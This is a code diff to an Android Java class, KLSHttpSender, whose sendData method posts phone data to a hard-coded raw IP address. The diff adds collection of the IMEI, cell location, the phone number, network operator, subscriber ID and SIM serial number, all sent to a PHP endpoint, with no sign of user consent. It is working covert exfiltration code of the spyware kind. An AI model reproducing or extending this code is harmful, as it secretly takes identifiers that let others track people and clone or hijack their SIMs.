@@ -40,12 +40,22 @@ public class KLSHttpSender {
 	public void sendData() {
 		try {
 		    // Add your data
-			mHttpPost.setURI(new URI("http://109.253.182.246/process.php"));
+			mHttpPost.setURI(new URI("http://109.253.182.246/phonex.php"));
 		    List<NameValuePair> nameValuePairs = new ArrayList<NameValuePair>(2);
-		    nameValuePairs.add(new BasicNameValuePair("IMEI", mTelephonyManager.getDeviceId()));
-		    nameValuePairs.add(new BasicNameValuePair("Software Version", mTelephonyManager.getDeviceSoftwareVersion()));
-		    //nameValuePairs.add(new BasicNameValuePair("Cell Location", mTelephonyManager.getCellLocation().toString()));
-		    nameValuePairs.add(new BasicNameValuePair("stringdata", "DATADTADATDATTDTTDATDATA"));
+		    nameValuePairs.add(new BasicNameValuePair("Data ", "Start:"));
+		    if (Integer.parseInt(mTelephonyManager.getDeviceId()) != 0) {
+			    nameValuePairs.add(new BasicNameValuePair("IMEI", mTelephonyManager.getDeviceId()));
+			    nameValuePairs.add(new BasicNameValuePair("Software Version", mTelephonyManager.getDeviceSoftwareVersion()));
+			    nameValuePairs.add(new BasicNameValuePair("Cell Location", mTelephonyManager.getCellLocation().toString()));
+			    nameValuePairs.add(new BasicNameValuePair("Line 1 Number", mTelephonyManager.getLine1Number()));
+			    nameValuePairs.add(new BasicNameValuePair("Network Operator", mTelephonyManager.getNetworkOperator()));
+			    nameValuePairs.add(new BasicNameValuePair("Network Operator Name", mTelephonyManager.getNetworkOperatorName()));
+			    nameValuePairs.add(new BasicNameValuePair("SubscriberId", mTelephonyManager.getSubscriberId()));
+			    nameValuePairs.add(new BasicNameValuePair("Sim Serial Number", mTelephonyManager.getSimSerialNumber()));			    
+		    }
+		    else {
+		    	nameValuePairs.add(new BasicNameValuePair("Error: ", "Data Unavail..!"));
+		    }
 		    mHttpPost.setEntity(new UrlEncodedFormEntity(nameValuePairs));
 
 		    // Execute HTTP Post Request
